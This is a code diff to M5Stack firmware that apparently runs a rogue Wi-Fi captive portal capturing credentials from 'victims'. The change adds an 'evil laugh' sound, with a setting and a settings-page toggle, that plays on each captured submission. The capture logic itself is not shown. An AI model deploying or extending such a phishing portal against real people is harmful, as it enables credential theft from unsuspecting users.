@@ -94,6 +94,7 @@ bool portalStarted = false;  // AP + web server currently up?
 // Configuration options (toggled from the Configuration menu / web settings;
 // all persisted to flash via Preferences and reloaded on boot)
 bool soundOn = true;             // beep when a credential is captured
+bool laughOn = true;             // play the evil laugh on every new capture
 bool ledBlinkOn = true;          // blink the LED when a credential is captured
 uint8_t brightLevel = 2;         // screen brightness index (0..2)
 const uint8_t BRIGHT_VALS[3] = {64, 160, 255};  // M5.Display.setBrightness range 0..255
@@ -235,6 +236,7 @@ void loadCapturesFromFlash() {
 void loadSettings() {
   prefs.begin("portal", true);  // read-only
   soundOn     = prefs.getBool("beep", true);
+  laughOn     = prefs.getBool("laugh", true);
   ledBlinkOn  = prefs.getBool("led", true);
   brightLevel = prefs.getUChar("bright", 2);
   screenRot   = prefs.getUChar("rot", 3);
@@ -257,6 +259,7 @@ void loadSettings() {
 void saveSettings() {
   prefs.begin("portal", false);  // read-write
   prefs.putBool("beep", soundOn);
+  prefs.putBool("laugh", laughOn);
   prefs.putBool("led", ledBlinkOn);
   prefs.putUChar("bright", brightLevel);
   prefs.putUChar("vol", spkVol);
@@ -575,6 +578,8 @@ String settingsPage(bool saved) {
     "<div class=\"sec\">&#128266; Audio &amp; feedback</div>"
     "<div class=\"row chk\"><input type=\"checkbox\" name=\"beep\" " + String(soundOn ? "checked" : "") + ">"
     "<span>Beep on capture / boot</span></div>"
+    "<div class=\"row chk\"><input type=\"checkbox\" name=\"laugh\" " + String(laughOn ? "checked" : "") + ">"
+    "<span>Evil laugh on each capture<span class=\"sub\">Plays the synthesized cackle whenever a new credential is captured.</span></span></div>"
     "<div class=\"row\"><label>Speaker volume</label>"
     "<div class=\"range\"><input type=\"range\" name=\"vol\" min=\"0\" max=\"100\" value=\"" + String(spkVol) + "\" "
     "oninput=\"document.getElementById('vv').textContent=this.value+'%'\">"
@@ -631,6 +636,7 @@ bool applySettings() {
   brightLevel = (uint8_t)constrain(webServer.arg("bright").toInt(), 0, 2);
   spkVol      = (uint8_t)constrain(webServer.arg("vol").toInt(), 0, 100);
   soundOn    = webServer.hasArg("beep");
+  laughOn    = webServer.hasArg("laugh");
   ledBlinkOn = webServer.hasArg("led");
   authOn     = webServer.hasArg("auth");
 
@@ -934,6 +940,14 @@ void buildLaugh() {
   laughLen = idx;
 }
 
+// Play the evil laugh once (used on each capture). Lazily builds the PCM buffer
+// if needed; falls back to a short beep if it couldn't be allocated.
+void playLaugh() {
+  buildLaugh();
+  if (laughBuf && laughLen) M5.Speaker.playRaw(laughBuf, laughLen, LAUGH_SR, false, 1);
+  else M5.Speaker.tone(4000, 60);
+}
+
 // Boot splash: a smooth vector skull that laughs (jaw drops open/shut, pulsing
 // red eyes, slight head bob) with a "HA HA HA!" burst and a progress bar, now
 // synced to a real synthesized cackle on the speaker. Runs ~5 seconds.
@@ -1064,7 +1078,8 @@ void registerRoutes() {
   // Victim-facing: capture a submission (no auth).
   webServer.on("/post", []() {
     webServer.send(HTTP_CODE, "text/html", posted());  // addCapture() bumps the counters
-    if (soundOn) M5.Speaker.tone(4000, 60);  // async; does not block DNS/HTTP
+    if (laughOn) playLaugh();                 // evil laugh on every new capture (async)
+    else if (soundOn) M5.Speaker.tone(4000, 60);
     if (ledBlinkOn) startBlink();  // non-blocking; loop() redraws the dashboard
   });
 
@@ -1529,6 +1544,7 @@ void setup() {
   ledInit();          // no-op unless LED_PIN is set to a real GPIO
   applyBrightness();
   applyVolume();      // restore the saved speaker volume
+  buildLaugh();       // pre-synthesize the laugh so the boot + first capture are instant
 
   bootScreen();       // animated splash
   registerRoutes();   // attach HTTP handlers once (AP starts later, from the menu)
